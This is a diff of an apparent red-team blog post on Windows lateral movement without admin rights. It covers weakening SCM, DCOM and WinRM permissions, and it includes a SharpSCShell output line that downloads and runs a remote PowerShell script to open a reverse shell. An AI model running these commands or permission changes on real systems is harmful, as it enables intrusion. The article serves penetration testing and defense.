@@ -3,7 +3,7 @@ title: Windows Lateral Movement - What You Really Need
 date: 2025-10-10 10:00:00 +0000
 categories: [lateral movement]
 tags: [lateral movement, rce, wmi, cim, winrm, minimal rights, dcom, task scheduling, scmanager, rpc, uac, acl, Find-DCOMLocalAdminAccess.ps1, microsoft policy, sc.exe, OpenService,CreateService,scm, RACE, BloodHound, enumeration, wmiman, scshell, service reconfiguration, service creation, access mask,SDDL, movement hound,mhound,invoke-movementhound]
-image: /assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/chart2.png
+image: /assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/chart2.png
 ---
 
 Last year, I conducted a security assessment for a company and was able to perform lateral movement on a target machine without having local administrator rights, by leveraging remote service creation.
@@ -22,7 +22,7 @@ Before starting the following tests, make sure that the `SeNetworkLogonRight` pr
 
 You can confirm this setting by navigating to: Local Security Policy → Local Policies → User Rights Assignment → Access this computer from the network.
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/netlogon.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/netlogon.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/netlogon.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/netlogon.png"  loading="lazy" alt="null"></a>
 <em>Access this computer from the network</em>
 
 On a Domain Controller, this configuration can be managed through the Group Policy Management Editor.
@@ -39,10 +39,10 @@ In these scenarios, UNIX-like tools like smbexec and psexec can be used for late
 
 Once authentication is complete, the service is created using the `[MS-SCMR]` interface via the well known named pipe `\pipe\svcctl`. The goal is to create a service on the target machine that executes a binary, running your command under the NT AUTHORITY\SYSTEM security context. After establishing a connection to the named pipe, the `OpenSCManager` function opens a handle to the Service Control Manager (SCM), followed by calls to `CreateService` and `StartService` to deploy and run the service.
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/servicecreation0.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/servicecreation0.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/servicecreation0.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/servicecreation0.png"  loading="lazy" alt="null"></a>
 
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/servicecreation.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/servicecreation.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/servicecreation.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/servicecreation.png"  loading="lazy" alt="null"></a>
 <em>Service creation process from smbexec.py</em>
 
 <blockquote class="prompt-info">
@@ -62,7 +62,7 @@ To facilitate communication, PsExec sets up custom named pipes using:
 This setup provides an interactive shell between the client and the remote host. 
 The system logs Event ID 7045 when a service is created and Event ID 7036 when the service starts, allowing visibility into both the payload and the service name via the ETW.
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/evtvwr.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/evtvwr.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/evtvwr.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/evtvwr.png"  loading="lazy" alt="null"></a>
 <em>Event viewer log of psexec execution</em>
 
 Of course, these aren’t the only artifacts generated, but a full analysis is beyond the scope of this post.
@@ -72,7 +72,7 @@ After execution, PsExec attempts to clean up by uninstalling the created service
 <h3 id="smbexec">Smbexec.py</h3>
 
 smbexec.py works like psexec.py, but avoids writing binaries to disk by creating a new service for each command, so it does not provide an interactive shell. Since it requires no payload upload, this eliminates the need for a writable share.
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/smbexec.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/smbexec.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/smbexec.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/smbexec.png"  loading="lazy" alt="null"></a>
 <em>smbexec.py execution</em>
 
 To retrieve command output, smbexec can use different techniques. The first is SERVER mode, which utilizes a share created on the attacker’s machine. In this mode, STDOUT and STDERR are redirected to a temporary file on that share. SERVER mode requires root privileges to bind on port 445, and the port cannot be changed unless you modify the code (useless since with the UNC notation we can’t specify a custom port.).
@@ -90,19 +90,19 @@ However, the second requirement can be easily bypassed by creating a service tha
 
 The first command smbexec executes is not your intended command, but rather `cd`. You can modify the command (<a href="https://github.com/fortra/impacket/blob/master/examples/smbexec.py#L251">at line 251</a>) to anything you want. For example, you could execute a reverse shell payload encoded in base64 that connects back to you:
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/encodedrevshell.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/encodedrevshell.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/encodedrevshell.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/encodedrevshell.png"  loading="lazy" alt="null"></a>
 <em>Encoded reverse shell payload</em>
 
 Smbexec will display an error due to the absence of a readable share to retrieve the output (<a href="https://github.com/fortra/impacket/blob/master/examples/smbexec.py#L325">by default, it attempts to use the `C$` share</a> and obviously the `IPC$` share can't be used for this purpose), but the payload will still execute, resulting in a reverse shell:
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/revshellobtained.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/revshellobtained.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/revshellobtained.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/revshellobtained.png"  loading="lazy" alt="null"></a>
 <em>Reverse shell obtained</em>
 
 Note that instead, psexec.py uses serviceinstall.py to create and start the service. If you want to use a reverse shell payload, you need to modify the serviceinstall.py script <a href="https://github.com/fortra/impacket/blob/master/impacket/examples/serviceinstall.py#L98">at line 98</a> and comment out the lines in psexec.py that search for writable shares.
 
 <blockquote class="prompt-info">
 If you manually start the created service, you will encounter the following error:
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/fashion.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/fashion.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/fashion.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/fashion.png"  loading="lazy" alt="null"></a>
 <em>Service start error</em>
 
 This is because the service’s main() function must call `StartServiceCtrlDispatcher()` to run the service control dispatcher, which establishes the connection between the SCM and the service process (either by extending the ServiceBase class in C# or manually).
@@ -111,7 +111,7 @@ At first glance, it seems that being a member of the local administrators group 
 
 I found <a href="https://pentestlab.blog/2023/03/20/persistence-service-control-manager/">this article</a>, which demonstrates that service creation, startup, and management can be delegated to specific users by modifying the security descriptor of the SCM. You can retrieve the SDDL (DACL and SACL description) of the SCM using the following command:
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/sdshow.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/sdshow.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/sdshow.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/sdshow.png"  loading="lazy" alt="null"></a>
 <em>sc sdshow scmanager command</em>
 
 Alternatively, you can convert the binary registry value from the registry key `HKLM:\SYSTEM\CurrentControlSet\Control\ServiceGroupOrder\Security`
@@ -143,12 +143,12 @@ Note that you must run this command with a high integrity level; otherwise, you 
 
 The ACE (Access Control Entry) `(A;;KA;;;AU)` grants Authenticated Users (AU) the `GENERIC_ALL (KA)` permission, effectively allowing full control.
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/scsdet.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/scsdet.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/scsdet.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/scsdet.png"  loading="lazy" alt="null"></a>
 <em>sc sdset scmanager command</em>
 
 I created a new domain user without adding it to any group and attempted to create a service using smbexec.py, but it failed with the following error:
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/accessdenied.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/accessdenied.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/accessdenied.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/accessdenied.png"  loading="lazy" alt="null"></a>
 <em>Access denied error</em>
 
 I struggled a bit to understand why it wasn’t working, and I also found it difficult to locate helpful resources online. However, after some research, I noticed <a href="https://support.microsoft.com/en-us/topic/block-remote-callers-who-are-not-local-administrators-from-starting-stopping-services-c5f77f8e-09e6-57e6-72d1-2c4423627a24">this policy</a>. 
@@ -168,15 +168,15 @@ It also shows how to disable this policy through the following registry keys:
 
 The first one is per-services and the second one is to disable the policy globally.
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/regvalue.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/regvalue.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/regvalue.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/regvalue.png"  loading="lazy" alt="null"></a>
 <em>Registry key to disable the policy</em>
 
 After rebooting the machine, I tried again and this time it worked. I was able to create a service using smbexec.py without being a member of the local administrators group, and without needing a writable/readable share or root privileges on the attacker's machine.
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/utente2.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/utente2.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/utente2.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/utente2.png"  loading="lazy" alt="null"></a>
 <em>User that is not member of the local administrators group</em>
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/revshellutente2.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/revshellutente2.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/revshellutente2.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/revshellutente2.png"  loading="lazy" alt="null"></a>
 <em>Reverse shell obtained</em>
 
 
@@ -191,7 +191,7 @@ Edit: While researching an sc.exe related issue (<a href="#scexe">see below</a>)
 
 To be certain about the registry key, I tested this on Windows Server 2012 and confirmed that simply changing the scmanager SDDL was sufficient. No registry modifications were required.
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/server2012.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/server2012.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/server2012.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/server2012.png"  loading="lazy" alt="null"></a>
 <em>Windows Server 2012</em>
 
 
@@ -203,7 +203,7 @@ I found that, if we want to strip it down to the essentials all you need as righ
 Assign these rights to a user as seen before and then change scmr.py (<a href="https://github.com/fortra/impacket/blob/b27827ae5dca76782c7bfb9b0cd6a47d97dd039b/impacket/dcerpc/v5/scmr.py#L1357">this line</a>) to request only these permissions when opening a handle to the SCM:
 
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/openscmanagerminrights.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/openscmanagerminrights.png" loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/openscmanagerminrights.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/openscmanagerminrights.png" loading="lazy" alt="null"></a>
 <em>SC_MANAGER_CREATE_SERVICE (0x0002) + SC_MANAGER_CONNECT (0x0001)</em>
 
 Instead, we don’t mind stripping down the service’s rights (aside from bypassing certain security audits), because we can create the service with whatever DACL we need, which allows tools like PsExec to start/delete it.
@@ -229,17 +229,17 @@ Similar to CrackMapExec, what’s being checked here is the presence of the `0xF
 
 There isn't much to note here. The first wall we encounter with PSExec is that it attempts to upload a payload to the `ADMIN$` share, which is not writable by our user.
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/psexec0.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/psexec0.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/psexec0.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/psexec0.png"  loading="lazy" alt="null"></a>
 <em>PsExec error</em>
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/psexec.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/psexec.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/psexec.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/psexec.png"  loading="lazy" alt="null"></a>
 <em>PsExec error</em>
 
 <h4 id="scexe">SC.exe</h4>
 
 sc.exe is a native Windows tool for managing services, but surprisingly even with the highest privileges like SC_MANAGER_ALL_ACCESS, it does not work as expected in this scenario. While I was able to create the service, attempting to start it resulted in an "access denied" error:
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/scerror.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/scerror.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/scerror.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/scerror.png"  loading="lazy" alt="null"></a>
 <em>sc.exe error</em>
 
 After some research, I found <a href="https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html#why-pwn3d">this article</a> describing the same error. In short, the sc start command uses the `OpenServiceW` function to obtain a handle to the service it wants to start. The DACL (Discretionary Access Control List) that is checked is the one assigned to the service itself, not the Service Control Manager. If you do not specify a DACL during service creation, the service inherits a default template that allows only local administrators to start, stop, or query the service, hence the access denied error.
@@ -257,7 +257,7 @@ So, at the end of the day we need a tool that can bypass the `OpenService` call 
 
 Enumeration only:
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/SCMMHOUND.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/SCMMHOUND.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/SCMMHOUND.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/SCMMHOUND.png"  loading="lazy" alt="null"></a>
 <em>MovementHound "scm", ex Find-SCMAccess</em>
 
 <H2 id="srecon">Service reconfiguration</H2>
@@ -267,7 +267,7 @@ Again I noticed that, without worrying about reverting the changes, all you need
 
 Modify [SharpSCShell](https://github.com/Mr-Un1k0d3r/SCShell/blob/master/SharpSCShell.cs) or the python version to request only these permissions when opening a handle to the SCManger and to the service (originally it requests `SC_MANAGER_ALL_ACCESS` for the SCManager and `SERVICE_ALL_ACCESS` for the service):
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/sharpscshell.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/sharpscshell.png" loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/sharpscshell.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/sharpscshell.png" loading="lazy" alt="null"></a>
 <em>SERVICE_CHANGE_CONFIG (0x0002) + SC_MANAGER_CONNECT (0x0001)</em>
 
 Ensure that the service you want to reconfigure has a DACL that allows your user to change its configuration and start SharpSCShell to execute your payload.
@@ -286,14 +286,14 @@ Ensure that the service you want to reconfigure has a DACL that allows your user
 [*] Service path was changed to "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.103 8891"
 [!] StartServiceA failed to start the service. Error:5
 ```
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/sharpscshell2.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/sharpscshell2.png" loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/sharpscshell2.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/sharpscshell2.png" loading="lazy" alt="null"></a>
 <em>DACL and successful execution</em>
 
 Without the start permission on the service, you must wait for the next reboot for your payload to execute (if the service is configured to start automatically). If you do have start permission, the script will launch it immediately (if you also specify `SERVICE_START (0x0010)` during the `OpenService` call). 
 
 Enumeration only:
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/scshell.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/scshell.png" loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/scshell.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/scshell.png" loading="lazy" alt="null"></a>
 <em>Service reconfiguration enumeration</em>
 
 This makes it a good alternative to service creation, especially when you want to avoid the event logs generated by creating a new service and leave no trace of the payload on disk.
@@ -310,7 +310,7 @@ Note that many DCOM servers spawn under the process `C:\Windows\system32\svchost
 
 After authentication, the client calls the `ISystemActivator` COM interface to create remote COM objects. The `RemoteCreateInstance` method is invoked with the CLSID of the desired object. If successful, a reference to the remote COM object is returned, allowing the client to interact with it and execute its methods.
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/dcomsystem.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/dcomsystem.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/dcomsystem.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/dcomsystem.png"  loading="lazy" alt="null"></a>
 <em>DCOM remote object creation process</em>
 <h3 id="wyrllyneedcom">What you really need</h3>
 Accessing DCOM objects requires specific permissions on the target application. While the default setup typically limits launch and activation rights to local administrators, it is not uncommon to encounter misconfigured systems in practice. For this reason, always verify the permission settings.
@@ -322,13 +322,13 @@ You can inspect and adjust these permissions using `dcomcnfg.exe`. At a minimum,
 
 The "Default" settings specify the permissions that DCOM applications will use unless overridden for a specific application. "Limits" define the maximum permissions that can be enforced, even if individual application settings are more permissive.
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/dcom.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/dcom.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/dcom.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/dcom.png"  loading="lazy" alt="null"></a>
 <em>DCOM configuration</em>
 
 
 Additionally, ensure that "Enable Distributed COM on this computer" is selected in the "My Computer" properties (this is enabled by default).
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/dcom2.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/dcom2.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/dcom2.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/dcom2.png"  loading="lazy" alt="null"></a>
 <em>DCOM configuration</em>
 
 You can also modify the Launch and Activation permissions for individual DCOM applications. This allows you to grant non-admin users access to specific applications, such as MMC20, while restricting others like ShellBrowserWindow.
@@ -338,7 +338,7 @@ To change permissions for a specific DCOM application, follow these steps (see <
 2. Open regedit and navigate to `"HKEY_CLASSES_ROOT\AppID"`. Right click the relevant APPID, select Permissions, click "Advanced", change the owner to your user, and grant your user Full Control.
 3. Return to dcomcnfg.exe, right click the application, select Properties, and go to the "Security" tab. Under "Launch and Activation Permissions", select "Customize" and click "Edit". Add your user and grant "Local Launch", "Remote Launch", and "Remote Activation" permissions.
 
-If the application does not appear in dcomcnfg.exe, you can locate it using the <a href="https://github.com/tyranid/oleviewdotnet">OLE/COM Object Viewer</a>. <a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/shellwindows.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/shellwindows.png"  loading="lazy" alt="null"></a>
+If the application does not appear in dcomcnfg.exe, you can locate it using the <a href="https://github.com/tyranid/oleviewdotnet">OLE/COM Object Viewer</a>. <a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/shellwindows.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/shellwindows.png"  loading="lazy" alt="null"></a>
 <em>OLE/COM Object Viewer</em><br>
 Note that some applications, such as ShellBrowserWindow and ShellWindows, require an interactive user session to be active on the target machine in order to function properly. This is because these COM objects interface directly with explorer.exe. As a result, any command executed through these interfaces will be spawned under the explorer.exe process, rather than mmc.exe.
 
@@ -346,7 +346,7 @@ In the OLE/COM Object Viewer, the RunAs section will display "Interactive User" 
 
 Additionally, you can change the security context under which a DCOM application runs. By default, it operates as "The launching user" or "Interactive user," but you can select "This user" in the "Identity" tab and specify any desired account.
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/dcmolast.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/dcmolast.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/dcmolast.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/dcmolast.png"  loading="lazy" alt="null"></a>
 <em>DCOM identity configuration</em>
 
 <h3 id="dcomexec.py">Dcomexec.py</h3>
@@ -374,7 +374,7 @@ $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"<command>","7"
 <blockquote class="prompt-info">
 <a href="https://simondotsh.com/infosec/2021/12/29/dcom-without-admin.html">As noted in this article</a>, the `ExecuteDCOM` edge in BloodHound is displayed only if the user is a member of the `Distributed COM Users` group. However, as we discussed, this condition is not always accurate. In my tests, for example, the user "utente2" was able to successfully invoke a DCOM application despite not having the edge in BloodHound. Conversely, the user "dave" did have the edge, likely because he is a member of the Distributed COM Users group.
 <p>
- <a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/executedcom.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/executedcom.png"  loading="lazy" alt="null"></a>
+ <a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/executedcom.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/executedcom.png"  loading="lazy" alt="null"></a>
 <em>ExecuteDCOM edge from BloodHound</em></p>
 </blockquote>
 
@@ -413,7 +413,7 @@ It's possible to modify these permissions to allow non-admin users to execute re
 
 In this dialog window, add a user or group and grant them `Execute (Invoke)` permissions:
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/winrm.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/winrm.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/winrm.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/winrm.png"  loading="lazy" alt="null"></a>
 <em>Microsoft.PowerShell URI ACLs</em>
 
 If you want to modify it without having a GUI:
@@ -423,7 +423,7 @@ $SDDL = “O:NSG:BAD:P(A;;GA;;;BA)(A;;GA;;;<SID>)(A;;GA;;;RM)S:P(AU;FA;GA;;;WD)(
 Set-PSSessionConfiguration -Name Microsoft.PowerShell -SecurityDescriptorSddl $SDDL
 ```
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/evilwinrm.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/evilwinrm.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/evilwinrm.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/evilwinrm.png"  loading="lazy" alt="null"></a>
 <em>Evil-WinRM execution</em>
 
 To enumerate, you can use a straightforward PowerShell command:
@@ -437,7 +437,7 @@ The interesting part is that other resources have no descriptor of their own, so
 
 So it’s still possible to use WinRS even when creating a new PSSession isn’t allowed, and vice versa. That’s why we need to enumerate both:
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/winrs.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/winrs.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/winrs.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/winrs.png"  loading="lazy" alt="null"></a>
 <em>Winrs execution</em>
 
 <h2 id="wmi">WMI</h2>
@@ -465,7 +465,7 @@ In addition, if you use WMI over DCOM you only need “Remote Activation” in t
 Instead, if you use WMI over WinRM, you must be a member of the “Remote Management Users” group. For example, this opens up the possibility of being a member of the “Remote Management Users” group without being able to laterally move using WinRM (for instance, if the group does not have the Execute (Invoke) permission on the PSSession), while still being able to execute commands remotely via WMI.
 
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/wmiman.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/wmiman.png"  loading="lazy" alt="null"></a>
+<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/wmiman.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed/img/wmiman.png"  loading="lazy" alt="null"></a>
 <em>"WMIMAN"</em>
 
 When using `Win32_Process.Create`, the call may return `ReturnValue = 8`, which the documentation describes only as "Unknown failure." This is a catch all code: it tells you only that the failure was none of the other documented ones (Access Denied, Insufficient Privilege, Path Not Found, Invalid Parameter). It can therefore have several causes but one common, by design cause is tied to how a user's registry hive is loaded during remote process creation.
@@ -490,7 +490,7 @@ During this test, keep in mind that when ADCS is installed, the Certificate Serv
 
 After successful authentication, the tool establishes a smooth, semi-interactive shell on the remote host. Because WmiExec neither installs new services nor writes executables to disk, it maintains a low footprint, making it a stealthy and widely adopted method for remote command execution. To retrieve the output of executed commands, it redirects STDOUT and STDERR to a file on the `ADMIN$` share, then reads the output from that file. Fortunately, as demonstrated with dcomexec.py, using the `-nooutput` option allows you to bypass this behavior and execute commands without caring about the output.
 
-<a href="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/wmi.png" class="popup img-link"><img src="/assets/posts/2025-10-10-LateralMovement-WhatYouReallyNeed.md/img/wmi.png"  loading="lazy" alt="null"></a>
